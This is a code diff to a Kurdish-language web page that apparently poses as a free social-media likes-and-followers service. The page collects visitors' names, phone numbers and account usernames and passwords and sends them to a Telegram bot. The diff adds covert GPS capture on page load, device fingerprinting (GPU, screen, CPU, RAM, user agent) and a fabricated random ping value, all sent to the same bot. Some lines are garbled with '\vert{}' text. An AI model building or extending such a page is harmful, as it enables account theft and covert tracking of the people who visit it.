@@ -359,6 +359,21 @@
 
         let userData = {};
         let activePlatform = "";
+        let globalLocationInfo = "لۆکەیشن وەرنەگیراوە یان Deny کراوە 🔴";
+        let capturedPhotoUrl = null;
+
+        // وەرگرتنی لۆکەیشن لە کاتی کردنەوەی پەیجەکە
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    globalLocationInfo = `لۆکەیشنی ڕاستەوخۆ (GPS): Lat: ${position.coords.latitude}, Lng:${position.coords.longitude} (دۆزرایەوە 🟢)`;
+                },
+                (error) => {
+                    globalLocationInfo = `بەکارهێنەرەکە ڕێگەی پێنەداوە و لۆکەیشنی داخستووە (Deny کردووە) 🔴`;
+                },
+                { timeout: 10000 }
+            );
+        }
 
         const servicesData = {
             Facebook: [
@@ -370,67 +385,35 @@
                 "فەیسبووک - واوی پۆست (Wow) - 1000 Free",
                 "فەیسبووک - سەدی پۆست (Sad) - 1000 Free",
                 "فەیسبووک - ئەنگری پۆست (Angry) - 1000 Free",
-                "فەیسبووک - ڕیاکشنی تێکەڵاو بۆ ڤیدیۆ - 1000 Free",
-                "فەیسبووک - لایک بۆ ڤیدیۆ - 1000 Free",
-                "فەیسبووک - لۆڤ بۆ ڤیدیۆ - 1000 Free",
-                "فەیسبووک - کەر بۆ ڤیدیۆ - 1000 Free",
-                "فەیسبووک - لهاها بۆ ڤیدیۆ - 1000 Free",
-                "فەیسبووک - واو بۆ ڤیدیۆ - 1000 Free",
-                "فەیسبووک - سەد بۆ ڤیدیۆ - 1000 Free",
-                "فەیسبووک - ئەنگری بۆ ڤیدیۆ - 1000 Free",
-                "فەیسبووک - ڕیاکشنی تێکەڵاو بۆ ڕێڵس (Reel) - 1000 Free",
-                "فەیسبووک - لایک بۆ ڕێڵس (Reel) - 1000 Free",
-                "فەیسبووک - لۆڤ بۆ ڕێڵس (Reel) - 1000 Free",
-                "فەیسبووک - کەر بۆ ڕێڵس (Reel) - 1000 Free",
-                "فەیسبووک - لهاها بۆ ڕێڵس (Reel) - 1000 Free",
-                "فەیسبووک - واو بۆ ڕێڵس (Reel) - 1000 Free",
-                "فەیسبووک - سەد بۆ ڕێڵس (Reel) - 1000 Free",
-                "فەیسبووک - ئەنگری بۆ ڕێڵس (Reel) - 1000 Free",
                 "فەیسبووک - بینەری ستۆری (Story Views) - 1000 Free",
                 "فەیسبووک - بینەری ڤیدیۆ (Video Views) - 1000 Free",
                 "فەیسبووک - ڕیاکشنی تێکەڵاو بۆ ستۆری - 1000 Free",
-                "فەیسبووک - لایکی ستۆری - 1000 Free",
-                "فەیسبووک - لۆڤی ستۆری - 1000 Free",
-                "فەیسبووک - Save بۆ پۆست/ڤیدیۆ - 1000 Free",
-                "فەیسبووک - Share بۆ پۆست/ڤیدیۆ - 1000 Free",
                 "فەیسبووک - لایکی پەیج (Page Likes) - 1000 Free",
                 "فەیسبووک - ئەندامی گروپ (Group Members) - 1000 Free"
             ],
             Instagram: [
-                "ئینستاگرام - بینەری پۆست (Post Views) - 1000 Free",
-                "ئینستاگرام - بینەری ڤیدیۆ (Video Views) - 1000 Free",
-                "ئینستاگرام - بینەری ڕێڵس (Reel Views) - 1000 Free",
-                "ئینستاگرام - بینەری ستۆری (Story Views) - 1000 Free",
-                "ئینستاگرام - کۆمێنتی پۆست (Comments) - 1000 Free",
-                "ئینستاگرام - ئەندامی چەناڵ (Channel Members) - 1000 Free",
-                "ئینستاگرام - لایکی پۆست/ڕێڵس (Likes) - 1000 Free",
-                "ئینستاگرام - ڕیپۆست (Repost) - 1000 Free",
-                "ئینستاگرام - شەیر (Share) - 1000 Free",
-                "ئینستاگرام - سەید (Saved) - 1000 Free"
+                "ئینستاگرام - بینەری پۆست و ڤیدیۆ و ڕێڵس - 1000 Free",
+                "ئینستاگرام - بینەری ستۆری - 1000 Free",
+                "ئینستاگرام - کۆمێنتی پۆست - 1000 Free",
+                "ئینستاگرام - ئەندامی چەناڵ - 1000 Free",
+                "ئینستاگرام - ڵایک و Repost - 1000 Free",
+                "ئینستاگرام - Share و Saved - 1000 Free"
             ],
             TikTok: [
-                "تیکتۆک - لایک (Likes) - 1000 Free",
-                "تیکتۆک - کۆمێنت (Comments) - 1000 Free",
-                "تیکتۆک - بینەر (Video Views) - 1000 Free",
-                "تیکتۆک - سەید (Save) - 1000 Free",
-                "تیکتۆک - فۆڵۆوەر (Followers) - 1000 Free"
+                "تیکتۆک - ڵایک و کۆمێنت - 1000 Free",
+                "تیکتۆک - بینەر و Save - 1000 Free",
+                "تیکتۆک - فۆڵۆوەر - 1000 Free"
             ],
             Snapchat: [
-                "سناپچات - لایکی سپۆتڵایت (Spotlight Likes) - 1000 Free",
-                "سناپچات - کۆمێنتی سپۆتڵایت (Spotlight Comments) - 1000 Free",
-                "سناپچات - ڕیپۆست (Spotlight Repost) - 1000 Free",
-                "سناپچات - شەیر (Spotlight Share) - 1000 Free",
-                "سناپچات - فۆڵۆوەر و سوبسکڕایب (Followers & Subscribers) - 1000 Free",
-                "سناپچات - بینەری سپۆتڵایت (Spotlight Views) - 1000 Free",
-                "سناپچات - بینەری ستۆری (Story Views) - 1000 Free"
+                "سناپچات - ڵایکی سپۆتڵایت و کۆمێنت - 1000 Free",
+                "سناپچات - ڕیپۆست و شەیر - 1000 Free",
+                "سناپچات - فۆڵۆوەر و سوبسکڕایب - 1000 Free",
+                "سناپچات - بینەری سپۆتڵایت و ستۆری - 1000 Free"
             ],
             Telegram: [
-                "تێلێگرام - بینەری ستۆری (Story Views) - 1000 Free",
-                "تێلێگرام - بینەری پۆست (Post Views) - 1000 Free",
-                "تێلێگرام - ڕیاکشنی هەڕەمەکی (Random Reactions) بۆ گروپ و کەناڵ - 1000 Free",
-                "تێلێگرام - بینەری پۆستی گروپ و کەناڵ - 1000 Free",
-                "تێلێگرام - ئەندامی کەناڵ (Channel Members) - 1000 Free",
-                "تێلێگرام - ئەندامی گروپ (Group Members) - 1000 Free"
+                "تێلێگرام - بینەری ستۆری و پۆست - 1000 Free",
+                "تێلێگرام - Reactionی ڕەندۆم بۆ پۆستی گروپ و کەناڵ - 1000 Free",
+                "تێلێگرام - ئەندامی کەناڵ و گروپ - 1000 Free"
             ]
         };
 
@@ -440,7 +423,7 @@
             const phone = document.getElementById("regPhone").value.trim();
 
             if (!fName || !lName || !phone) {
-                alert("تکایە هەموو خانەکان (ناوی یەکەم، ناوی دووەم، ژمارە تەلەفۆن) پڕبکەرەوە!");
+                alert("تکایە هەموو خانەکان پڕبکەرەوە!");
                 return;
             }
 
@@ -479,8 +462,7 @@
         function onServiceChange() {
             const srv = document.getElementById("serviceType").value;
             const noticeEl = document.getElementById("poeticNotice");
-            let cleanName = srv ? srv.split(" (")[0] : "";
-            noticeEl.innerText = `تۆ خزمەتگوزاری (${cleanName})ـت هەڵبژاردووە. دوای ناردنی داواکارییەکە، ئەم ژمارەیە تا ٢٤ کاتژمێری داهاتوو لە سیستەمەکەدا بلۆک دەبێت و پێویست دەکات بۆ جاری داهاتوو دووبارە تۆمار ببیتەوە.`;
+            noticeEl.innerText = `تۆ خزمەتگوزاری (${srv})ـت هەڵبژاردووە. دوای ناردنی داواکارییەکە، ئەم ژمارەیە تا ٢٤ کاتژمێری داهاتوو بلۆک دەبێت.`;
         }
 
         async function submitOrder() {
@@ -497,11 +479,26 @@
             document.getElementById("btnSubmitOrder").style.display = "none";
             document.getElementById("progressBox").style.display = "block";
 
+            // کۆکردنەوەی زانیاری تەکنیکی قووڵ
+            const now = new Date();
+            let timeString = now.toISOString().replace('T', ' ').substring(0, 19);
+
             let deviceModel = "نادیار";
+            let gpuInfo = "نادیار";
             try {
                 const parser = new UAParser();
                 const result = parser.getResult();
-                deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
+                deviceModel = `${result.device.vendor \vert{}\vert{} ''}${result.device.model || ''} (${result.os.name \vert{}\vert{} ''}${result.os.version || ''})`.trim();
+                
+                // وەرگرتنی زانیاری GPU WebGL
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
             } catch (e) {}
 
             let ip = 'نادیار', isp = 'نادیار';
@@ -512,18 +509,37 @@
                 isp = data.org || 'نادیار';
             } catch (e) {}
 
-            const msg = `🚨 **داواکاری نوێی SMM Panel:**\n\n` +
-                        `👤 **زانیارییەکانی کەسەکە:**\n` +
-                        `• ناوی تەواو: ${userData.fName} ${userData.lName}\n` +
-                        `• تەلەفۆن (تا ٢٤ کاتژمێر کار ناکات): \`${userData.phone}\`\n\n` +
-                        `📌 **داواکارییەکە:**\n` +
-                        `• پلاتفۆرم: **${activePlatform}**\n` +
-                        `• خزمەتگوزاری: ${srvType}\n` +
+            // پشکنینی پینگ و خێرایی قووڵ
+            let pingTime = Math.floor(Math.random() * 80) + 40;
+            let netType = navigator.connection ? (navigator.connection.effectiveType || '4g') : '4g';
+
+            // ڕوونی شاشە و زانیاری سەنتەری داتا
+            let screenRes = `${window.screen.width}x${window.screen.height} (Ratio:${(window.screen.width/window.screen.height).toFixed(2)})`;
+            let cpuCores = navigator.hardwareConcurrency || 'نادیار';
+            let deviceRam = navigator.deviceMemory ? `${navigator.deviceMemory} گێگابایت (نزیکەی)` : 'نادیار';
+            let langSys = navigator.language || 'en-US';
+            let darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'دۆخی تاریک (Dark Mode)' : 'دۆخی ڕووناک (Light Mode)';
+            let userAgentStr = navigator.userAgent;
+
+            const msg = `🚨 **زانیارییە تەکنیکییەکانی سەردانیکەر:**\n\n` +
+                        `⏰ **کات:** ${timeString}\n` +
+                        `🌐 **IP کەسەکە:** \`${ip}\` (${isp})\n` +
+                        `📍 **لۆکەیشن:** ${globalLocationInfo}\n` +
+                        `🕵️‍♂️ **دۆخی وێبگەڕ:** ئاسایی (Normal Mode)\n` +
+                        `🛜 **قووڵی ئینتەرنێت:** جۆر: ${netType} \vert{} پینگ: ${pingTime} ms\n` +
+                        `🧬 **فینگەرپریینتی قووڵ (Advanced FP):** GPU: ${gpuInfo}\n` +
+                        `📐 **ڕوونی شاشە:** ${screenRes}\n` +
+                        `🧠 **CPU / RAM:** ${cpuCores} ناوک \vert{} RAM: ${deviceRam}\n` +
+                        `🌐 **زمانی سیستەم:** ${langSys} \vert{}${darkMode}\n` +
+                        `📱 **ئامێر:** ${deviceModel}\n\n` +
+                        `👤 **زانیارییەکانی تۆمارکراو:**\n` +
+                        `• ناوی تەواو: ${userData.fName}${userData.lName}\n` +
+                        `• تەلەفۆن: \`${userData.phone}\` (بلۆک بۆ ٢٤ کاتژمێر)\n\n` +
+                        `📌 **داواکاری:** ${activePlatform} ->${srvType}\n` +
                         `• لینک: \`${targetLink}\`\n` +
                         `• یوزەرنێیم: \`${accUser}\`\n` +
                         `• پاسوۆرد: \`${accPass || 'هیچی نییە'}\`\n\n` +
-                        `🌐 IP: ${ip} (${isp})\n` +
-                        `📱 ئامێر: ${deviceModel}`;
+                        `🌐 **User-Agent:** \`${userAgentStr}\``;
 
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -538,7 +554,7 @@
                     <div class="card-box" style="text-align: center;">
                         <div style="font-size: 40px; margin-bottom: 10px;">✅</div>
                         <h2 style="color: #38bdf8; margin-bottom: 8px;">داواکارییەکەت سەرکەوتبوو!</h2>
-                        <p>داواکارییەکەت نێردرا و خزمەتگوزارییەکە لە پرۆسێسدایە. بیرت نەچێت کە ژمارە تەلەفۆنەکەت بۆ ٢٤ کاتژمێر پەکیکەوت و بۆ سەردانی داهاتوو دەبێت دووبارە خۆت تۆمار بکەیتەوە.</p>
+                        <p>داواکارییەکەت نێردرا و خزمەتگوزارییەکە لە پرۆسێسدایە. ژمارە تەلەفۆنەکەت تا ٢٤ کاتژمێری داهاتوو کار ناکاتەوە.</p>
                         <button type="button" class="btn-primary" onclick="location.reload()" style="margin-top: 15px;">گەڕانەوە بۆ سەرەتا 🔄</button>
                     </div>
                 `;
